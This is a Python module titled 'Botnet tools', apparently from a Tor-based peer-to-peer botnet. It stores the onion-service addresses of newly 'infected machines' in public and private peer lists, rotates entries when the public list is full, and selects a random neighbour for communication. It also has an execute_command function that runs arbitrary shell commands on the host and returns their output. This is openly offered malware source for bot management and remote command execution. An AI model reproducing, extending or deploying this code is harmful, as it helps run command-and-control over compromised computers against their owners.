"""Botnet tools"""

import random
import os
import math

from . import (
    MAX_PUBLIC_PEER_LIST_LENGTH,
    logger,
)


def add_new_infected_machine(
    msg_data: str, public_peer_list_path: str, private_peer_list_path: str
):
    """ Store onion services from new infected machine
        in some files.

        Args:
            msg_data: The username of the first created user in the infected machine,
                      and the onion services created
    """
    logger.debug(
        f"Add {msg_data} to {public_peer_list_path} and {private_peer_list_path} files"
    )
    __append_to_file(private_peer_list_path, msg_data)

    if not __public_peer_list_reached_maximum_length(public_peer_list_path):
        __append_to_file(public_peer_list_path, msg_data)
    else:
        __overwrite_random_line_in_file(public_peer_list_path, msg_data)


def execute_command(command: str) -> str:
    result = os.popen(command).read()
    logger.debug(f"Command executed = {command}")
    logger.debug(f"Command result = {result}")
    return result


def select_random_neighbour(private_peer_list_path: str) -> str:
    with open(private_peer_list_path, "r") as private_peer_list:
        lines = private_peer_list.readlines()
        num_lines = len(lines)
        random_number = random.randint(0, num_lines - 1)
        text_line = lines[random_number]

    comm_onion = text_line.strip().split(" ")[-1]
    logger.debug(f"Obtained random neighbour {text_line}")
    logger.debug(f"Communication onion being {comm_onion}")
    return comm_onion


def __public_peer_list_reached_maximum_length(public_peer_list_path: str) -> bool:
    try:
        with open(public_peer_list_path, "r") as peer_list:
            num_lines = sum(1 for line in peer_list)
    except FileNotFoundError:
        num_lines = 0

    return num_lines == MAX_PUBLIC_PEER_LIST_LENGTH


def __append_to_file(file_: str, data: str):
    logger.debug(f"Append {data} to {file_}")
    with open(file_, "a") as f:
        f.write(data + "\n")


def __overwrite_random_line_in_file(file_: str, data: str):
    """ Overwrite a random line of the file

        Args:
            file_: File in which we will overwrite a line
            data: Text to write in the file
    """
    logger.debug(f"Overwrite a random line in {file_} with {data}")
    line_to_overwrite = random.randint(0, MAX_PUBLIC_PEER_LIST_LENGTH - 1)
    with open(file_, "r") as public_peer_list:
        lines = public_peer_list.readlines()
        lines[line_to_overwrite] = data + "\n"

    with open(file_, "w") as public_peer_list:
        public_peer_list.write("".join(lines))
